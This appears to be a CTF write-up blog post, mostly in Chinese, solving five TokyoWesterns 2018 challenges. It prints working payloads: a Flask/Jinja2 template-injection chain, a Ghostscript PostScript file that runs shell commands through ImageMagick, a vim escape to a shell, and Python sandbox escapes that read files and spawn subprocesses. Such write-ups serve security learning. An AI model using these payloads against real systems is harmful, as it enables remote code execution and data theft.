---
title: TokyoWesterns CTF
date: 2018-09-02 22:32:29
tags: ctf
---

# SimpleAuth

```php
<?php

require_once 'flag.php';

if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['action'])){
        $action = $res['action'];
    }
}

if ($action === 'auth') {
    if (!empty($res['user'])) {
        $user = $res['user'];
    }
    if (!empty($res['pass'])) {
        $pass = $res['pass'];
    }

    if (!empty($user) && !empty($pass)) {
        $hashed_password = hash('md5', $user.$pass);
    }
    if (!empty($hashed_password) && $hashed_password === 'c019f6e5cd8aa0bbbcc6e994a54c757e') {
        echo $flag;
    }
    else {
        echo 'fail :(';
    }
}
else {
    highlight_file(__FILE__);
}
```

payload:

`http://simpleauth.chal.ctf.westerns.tokyo/?hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e&action=auth`

# Shrine

```python

import flask
import os


app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/<path:shrine>')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s
    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)
```

### 递归打印对象的所有字属性

```python
def search(obj, max_depth):
    
    visited_clss = []
    visited_objs = []
    
    def visit(obj, path='obj', depth=0):
        yield path, obj
        
        if depth == max_depth:
            return

        elif isinstance(obj, (int, float, bool, str, bytes)):
            return

        elif isinstance(obj, type):
            if obj in visited_clss:
                return
            visited_clss.append(obj)
            print(obj)

        else:
            if obj in visited_objs:
                return
            visited_objs.append(obj)
        
        # attributes
        for name in dir(obj):
            if name.startswith('__') and name.endswith('__'):
                if name not in  ('__globals__', '__class__', '__self__',
                                 '__weakref__', '__objclass__', '__module__'):
                    continue
            attr = getattr(obj, name)
            yield from visit(attr, '{}.{}'.format(path, name), depth + 1)
        
        # dict values
        if hasattr(obj, 'items') and callable(obj.items):
            try:
                for k, v in obj.items():
                    yield from visit(v, '{}[{}]'.format(path, repr(k)), depth)
            except:
                pass
        
        # items
        elif isinstance(obj, (set, list, tuple, frozenset)):
            for i, v in enumerate(obj):
                yield from visit(v, '{}[{}]'.format(path, repr(i)), depth)
            
    yield from visit(obj)
```

### 寻找config

```python
for path, obj in search(flask.request, 10):
	if str(obj) == app.config['FLAG']:
	return path
```

`obj.application.__self__._load_form_data.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']`

除了`request`对象之外，其他全局变量类似于`g`, `session`通过更多或更少层次的遍历，也是可以找到flag。

### payload

```python
http://shrine.chal.ctf.westerns.tokyo/shrine/%7B%7Brequest.application.__self__._load_form_data.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']%7D%7D
```

# Slack emoji converter


  ```python

from flask import (
    Flask,
    render_template,
    request,
    redirect,
    url_for,
    make_response,
)
from PIL import Image
import tempfile
import os


app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/source')
def source():
    return open(__file__).read()

@app.route('/conv', methods=['POST'])
def conv():
    f = request.files.get('image', None)
    if not f:
        return redirect(url_for('index'))
    ext = f.filename.split('.')[-1]
    fname = tempfile.mktemp("emoji")
    fname = "{}.{}".format(fname, ext)
    f.save(fname)
    img = Image.open(fname)
    w, h = img.size
    r = 128/max(w, h)
    newimg = img.resize((int(w*r), int(h*r)))
    newimg.save(fname)
    response = make_response()
    response.data = open(fname, "rb").read()
    response.headers['Content-Disposition'] = 'attachment; filename=emoji_{}'.format(f.filename)
    os.unlink(fname)
    return response

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080, debug=True)
  ```

这段代码本身没有问题，问题出在依赖的`PIL.Image`库,该库依赖于`ImageMagick`。可以通过`sudo apt-get install imagemagick`

ImageMagick1day利用。

代码:

```
python: newimg = img.resize((int(w*r), int(h*r)))
=> 
命令行: convert shell.jpeg -crop 100X100+10+10 img_crop.jpeg
```

主要是imagemaick的ghost script RCE漏洞。

```shell
gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null
```

若成功执行则存在漏洞。

ubuntu下payload:

shell.jpeg:

```
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

运行:

> convert shell.jpeg what.gif

结果：

```shell
qianfa@qianfa:~/goscript$ convert shell.jpeg what.gif
uid=1000(qianfa) gid=1000(qianfa) groups=1000(qianfa),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
convert: FailedToExecuteCommand `"gs" -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 "-sDEVICE=pngalpha" -dTextAlphaBits=4 -dGraphicsAlphaBits=4 "-r72x72" -g612x792  "-sOutputFile=/tmp/magick-115904M-6fITFX1ezd%d" "-f/tmp/magick-115904XRfng5YFMWcZ" "-f/tmp/magick-115904phWq9gVRvPQK" -c showpage' (-1) @ error/delegate.c/ExternalDelegateCommand/461.
convert: no images defined `what.gif' @ error/convert.c/ConvertImageCommand/3210.
```



# vimshell

`:`, `g` and `Q` 三个字符从vim中去掉了，但是没有去掉`K`,

在文件中命令之前，比如`diff`前边按`K`可以显示`man diff`，也就是`diff`的帮助命令,

然而`man`可以执行命令。

> !ls /
>
> !cat /flag

或者：

> chrome -app=[https://vimshell.chal.ctf.westerns.tokyo](https://vimshell.chal.ctf.westerns.tokyo/)
>
> Ctrl + W -> :! cat /flag

# pysandbox

```python
import sys
import ast


blacklist = [ast.Call, ast.Attribute]

def check(node):
    if isinstance(node, list):
        return all([check(n) for n in node])
    else:
        """
	expr = BoolOp(boolop op, expr* values)
	     | BinOp(expr left, operator op, expr right)
	     | UnaryOp(unaryop op, expr operand)
	     | Lambda(arguments args, expr body)
	     | IfExp(expr test, expr body, expr orelse)
	     | Dict(expr* keys, expr* values)
	     | Set(expr* elts)
	     | ListComp(expr elt, comprehension* generators)
	     | SetComp(expr elt, comprehension* generators)
	     | DictComp(expr key, expr value, comprehension* generators)
	     | GeneratorExp(expr elt, comprehension* generators)
	     -- the grammar constrains where yield expressions can occur
	     | Yield(expr? value)
	     -- need sequences for compare to distinguish between
	     -- x < 4 < 3 and (x < 4) < 3
	     | Compare(expr left, cmpop* ops, expr* comparators)
	     | Call(expr func, expr* args, keyword* keywords,
			 expr? starargs, expr? kwargs)
	     | Repr(expr value)
	     | Num(object n) -- a number as a PyObject.
	     | Str(string s) -- need to specify raw, unicode, etc?
	     -- other literals? bools?

	     -- the following expression can appear in assignment context
	     | Attribute(expr value, identifier attr, expr_context ctx)
	     | Subscript(expr value, slice slice, expr_context ctx)
	     | Name(identifier id, expr_context ctx)
	     | List(expr* elts, expr_context ctx) 
	     | Tuple(expr* elts, expr_context ctx)

	      -- col_offset is the byte offset in the utf8 string the parser uses
	      attributes (int lineno, int col_offset)

        """

        attributes = {
            'BoolOp': ['values'],
            'BinOp': ['left', 'right'],
            'UnaryOp': ['operand'],
            'Lambda': ['body'],
            'IfExp': ['test', 'body', 'orelse'],
            'Dict': ['keys', 'values'],
            'Set': ['elts'],
            'ListComp': ['elt'],
            'SetComp': ['elt'],
            'DictComp': ['key', 'value'],
            'GeneratorExp': ['elt'],
            'Yield': ['value'],
            'Compare': ['left', 'comparators'],
            'Call': False, # call is not permitted
            'Repr': ['value'],
            'Num': True,
            'Str': True,
            'Attribute': False, # attribute is also not permitted
            'Subscript': ['value'],
            'Name': True,
            'List': ['elts'],
            'Tuple': ['elts'],
            'Expr': ['value'], # root node 
        }

        for k, v in attributes.items():
            if hasattr(ast, k) and isinstance(node, getattr(ast, k)):
                if isinstance(v, bool):
                    return v
                return all([check(getattr(node, attr)) for attr in v])


if __name__ == '__main__':
    expr = sys.stdin.read()
    body = ast.parse(expr).body
 	print body
    if check(body):
        sys.stdout.write(repr(eval(expr)))
    else:
        sys.stdout.write("Invalid input")
    sys.stdout.flush()
```

官网过滤https://docs.python.org/2/library/ast.html:

```
expr = BoolOp(boolop op, expr* values)
	     | BinOp(expr left, operator op, expr right)
	     | UnaryOp(unaryop op, expr operand)
	     | Lambda(arguments args, expr body)
	     | IfExp(expr test, expr body, expr orelse)
	     | Dict(expr* keys, expr* values)
	     | Set(expr* elts)
	     | ListComp(expr elt, comprehension* generators)
	     | SetComp(expr elt, comprehension* generators)
	     | DictComp(expr key, expr value, comprehension* generators)
	     | GeneratorExp(expr elt, comprehension* generators)
	     -- the grammar constrains where yield expressions can occur
	     | Yield(expr? value)
	     -- need sequences for compare to distinguish between
	     -- x < 4 < 3 and (x < 4) < 3
	     | Compare(expr left, cmpop* ops, expr* comparators)
	     | Call(expr func, expr* args, keyword* keywords,
			 expr? starargs, expr? kwargs)
	     | Repr(expr value)
	     | Num(object n) -- a number as a PyObject.
	     | Str(string s) -- need to specify raw, unicode, etc?
	     -- other literals? bools?

	     -- the following expression can appear in assignment context
	     | Attribute(expr value, identifier attr, expr_context ctx)
	     | Subscript(expr value, slice slice, expr_context ctx)
	     | Name(identifier id, expr_context ctx)
	     | List(expr* elts, expr_context ctx) 
	     | Tuple(expr* elts, expr_context ctx)

	      -- col_offset is the byte offset in the utf8 string the parser uses
	      attributes (int lineno, int col_offset)
```

区别案例：

| Original                                             | Implemented Checks    | Unchecked parts |
| ---------------------------------------------------- | --------------------- | --------------- |
| Lambda(arguments args, expr body)                    | 'Lambda': ['body']    | args            |
| ListComp(expr elt, comprehension* generators)        | 'ListComp': ['elt']   | generators      |
| Subscript(expr value, slice slice, expr_context ctx) | Subscript': ['value'] | slice, ctx      |

payload:

list: 

- 	`[e for e in list(open('flag'))]`
- 	`[1 for x in [eval("sys.stdout.write(repr([t for t in ().__class__.__base__.__subclasses__() if t.__name__ == 'Sized'][0].__len__.__globals__['__builtins__']['__import__']('subprocess').check_output('cat flag', shell=True)))")]]`

Subscript: 

- `[][sys.stdout.write(open('flag').read())]`

我们以`Subscript`为例, 打印`ast.parse`处理后的结果:

```python
 expr = "[][sys.stdout.write(open('shell.php').read())]"
 body = ast.parse(expr)
 print ast.dump(body)
```

我们可以发现表达式被解析成几个部分:`value`, `slice`, `ctx`

```shell
Module(body=[Expr(value=Subscript(value=List(elts=[], ctx=Load()), slice=Index(value=Call(func=Attribute(value=Attribute(value=Name(id='sys', ctx=Load()), attr='stdout', ctx=Load()), attr='write', ctx=Load()), args=[Call(func=Attribute(value=Call(func=Name(id='open', ctx=Load()), args=[Str(s='shell.php')], keywords=[], starargs=None, kwargs=None), attr='read', ctx=Load()), args=[], keywords=[], starargs=None, kwargs=None)], keywords=[], starargs=None, kwargs=None)), ctx=Load()))])
```

sandbox中仅仅检查了`value`，因而，可以绕过该sandbox。